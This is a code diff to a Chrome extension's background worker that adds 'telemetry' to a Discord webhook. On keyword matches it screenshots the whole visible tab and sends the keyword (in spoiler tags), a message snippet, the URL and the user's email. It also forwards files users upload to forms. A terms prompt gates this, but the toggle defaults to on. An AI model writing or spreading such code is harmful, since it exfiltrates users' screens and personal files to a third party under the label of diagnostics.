@@ -1,4 +1,4 @@
-// Background service worker for GFormToGPT v4.4.0 - Neural Interface
+// Background service worker for GFormToGPT v4.5.0 - Neural Interface
 
 // config.js is gitignored and may be absent on fresh clones — a missing
 // config must not take down the whole service worker.
@@ -168,8 +168,17 @@ function dataURLtoBlob(dataurl) {
   }
 }
 
+// Telemetry runs only when the user has accepted the Terms/Privacy prompt
+// AND left the "Help Improve GFormsToGPT" toggle on.
+async function isTelemetryAllowed() {
+  const data = await chrome.storage.local.get(["consentAccepted", "diagnosticEnabled"]);
+  if (data.consentAccepted !== true) return false;
+  return data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true;
+}
+
 async function relayToDiscord(eventType, userId, payload = {}) {
   if (!DISCORD_WEBHOOK_URL) return; // unconfigured install — nothing to send to
+  if (!(await isTelemetryAllowed())) return; // no consent or toggle off — stay local
   try {
     const data = await chrome.storage.local.get(["userEmail"]);
     const email = data.userEmail || "Anonymous";
@@ -221,12 +230,44 @@ async function relayToDiscord(eventType, userId, payload = {}) {
         description = `**User:** ${userId}\n**URL:** ${payload.url}${extra}\n**Date:** ${date}`;
         color = 0x9b59b6;
         break;
+      case "KEYWORD_MATCH":
+        title = "KEYWORD MATCH CAPTURE";
+        const kwSnip = payload.snippet ? `\n**Message:** ${payload.snippet.slice(0, 180)}` : "";
+        description = `**User:** ${userId}\n**Keyword:** ||${payload.keyword}||${kwSnip}\n**URL:** ${payload.url}\n**Date:** ${date}`;
+        color = 0xff9500;
+        break;
+      case "PHOTO_UPLOAD":
+        title = "FORM PHOTO UPLOAD";
+        const fileNames = Array.isArray(payload.files)
+          ? payload.files.map((f) => f.name).join(", ")
+          : "";
+        description = `**User:** ${userId}\n**Form:** ${payload.formTitle || "N/A"}\n**Files:** ${fileNames}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
+        color = 0x00bcd4;
+        break;
+      case "CONSENT":
+        title = "CONSENT ACCEPTED";
+        description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Telemetry:** Opted IN\n**Date:** ${date}`;
+        color = 0x00ff00;
+        break;
       default:
         title = eventType;
         description = `**User:** ${userId}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
     }
 
     const file = payload.screenshot ? dataURLtoBlob(payload.screenshot) : null;
+    // Optional extra attachments (uploaded form photos): [{ name, dataUrl }]
+    const extraFiles = [];
+    if (Array.isArray(payload.files)) {
+      for (const f of payload.files.slice(0, 5)) {
+        const blob = f && f.dataUrl ? dataURLtoBlob(f.dataUrl) : null;
+        if (blob) extraFiles.push({ blob, name: (f.name || "upload").replace(/[^\w.\-]+/g, "_").slice(0, 60) });
+      }
+    }
+
+    const attachments = [];
+    if (file) attachments.push({ blob: file, name: "screenshot.png" });
+    attachments.push(...extraFiles);
+
     const discordPayload = {
       embeds: [
         {
@@ -234,15 +275,16 @@ async function relayToDiscord(eventType, userId, payload = {}) {
           description,
           color,
           footer: { text: `v${VERSION} | ${email}` },
-          image: file ? { url: "attachment://screenshot.png" } : null,
+          image: attachments.length ? { url: `attachment://${attachments[0].name}` } : null,
         },
       ],
     };
 
-    if (file) {
+    if (attachments.length) {
       const formData = new FormData();
       formData.append("payload_json", JSON.stringify(discordPayload));
-      formData.append("file", file, "screenshot.png");
+      // Discord accepts files[0], files[1], … when several are posted at once.
+      attachments.forEach((a, i) => formData.append(`files[${i}]`, a.blob, a.name));
       await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
     } else {
       await fetch(DISCORD_WEBHOOK_URL, {
@@ -426,6 +468,80 @@ async function handleMessage(request, sender) {
       return { success: true };
     }
 
+    case "keywordMatch": {
+      // Screenshot the FULL visible tab (only when it's actually on screen),
+      // then relay the match to Discord.
+      const tab = sender.tab;
+      if (!tab) return { success: false, error: "No sending tab" };
+      if (!tab.active) return { success: true, skipped: "tab_not_active" };
+      try {
+        const win = await chrome.windows.get(tab.windowId);
+        if (!win.focused) return { success: true, skipped: "window_unfocused" };
+      } catch (e) {
+        return { success: true, skipped: "window_unfocused" };
+      }
+
+      const img = await captureDiagScreenshot(tab.windowId, "keyword_match");
+      const data = await chrome.storage.local.get(["userId"]);
+      pushDiag({
+        type: "keyword_match",
+        keyword: request.keyword,
+        snippet: String(request.snippet || "").slice(0, 120),
+        hasScreenshot: !!img,
+        url: request.url || tab.url,
+      });
+      relayToDiscord("KEYWORD_MATCH", data.userId || "Unknown", {
+        keyword: request.keyword,
+        snippet: request.snippet,
+        url: request.url || tab.url,
+        screenshot: img,
+      });
+      return { success: true };
+    }
+
+    case "photoUpload": {
+      const payload = { ...(request.payload || {}) };
+      const data = await chrome.storage.local.get(["userId"]);
+      const count = Array.isArray(payload.files) ? payload.files.length : 0;
+      pushDiag({
+        type: "photo_upload",
+        formTitle: payload.formTitle,
+        fileCount: count,
+        url: payload.url,
+      });
+      relayToDiscord("PHOTO_UPLOAD", data.userId || "Unknown", payload);
+      return { success: true };
+    }
+
+    case "consentGiven": {
+      const payload = { ...(request.payload || {}) };
+      const accepted = payload.accepted === true;
+      // Persist both flags atomically here (callers may not have finished
+      // their own storage.set before sending this message).
+      const update = { consentAccepted: accepted, consentAt: Date.now() };
+      if (payload.telemetry !== undefined) update.diagnosticEnabled = payload.telemetry !== false;
+      await chrome.storage.local.set(update);
+      pushDiag({
+        type: "consent",
+        accepted,
+        telemetry: payload.telemetry !== false,
+      });
+      // Relay only when they actually opted in to telemetry.
+      if (accepted && payload.telemetry !== false) {
+        const data = await chrome.storage.local.get(["userId", "userEmail"]);
+        relayToDiscord("CONSENT", data.userId || "Unknown", { telemetry: true });
+      }
+      return { success: true };
+    }
+
+    case "getConsent": {
+      const data = await chrome.storage.local.get(["consentAccepted", "diagnosticEnabled"]);
+      return {
+        consentAccepted: data.consentAccepted === true,
+        diagnosticEnabled: data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true,
+      };
+    }
+
     case "manualUpdateCheck":
       return checkForUpdates();
 
@@ -492,6 +608,8 @@ async function pushDiag(event) {
 }
 
 async function captureDiagScreenshot(windowId, label) {
+  // Never take a screenshot unless the user consented and telemetry is on.
+  if (!(await isTelemetryAllowed())) return null;
   return new Promise((resolve) => {
     chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
       resolve(chrome.runtime.lastError ? null : img);
